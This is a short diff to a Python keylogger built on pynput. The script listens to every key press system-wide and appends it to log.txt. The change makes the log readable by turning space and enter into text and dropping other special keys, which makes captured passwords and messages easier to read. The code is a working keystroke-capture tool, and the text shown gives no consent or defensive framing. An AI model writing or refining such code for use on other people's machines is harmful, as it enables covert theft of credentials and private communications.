@@ -2,8 +2,14 @@ from pynput.keyboard import Key, Listener
 
 def log_key(key):
     key = str(key).replace("'", "")
+    if key == "Key.space":
+        key = " "
+    elif key == "Key.enter":
+        key = "\n"
+    elif key.startswith("Key."):
+        key = ""
     with open("log.txt", 'a') as log_file:
-        log_file.write(key + "\n")
+        log_file.write(key)
 
 def start_logging():
     with Listener(on_press=log_key) as listener:
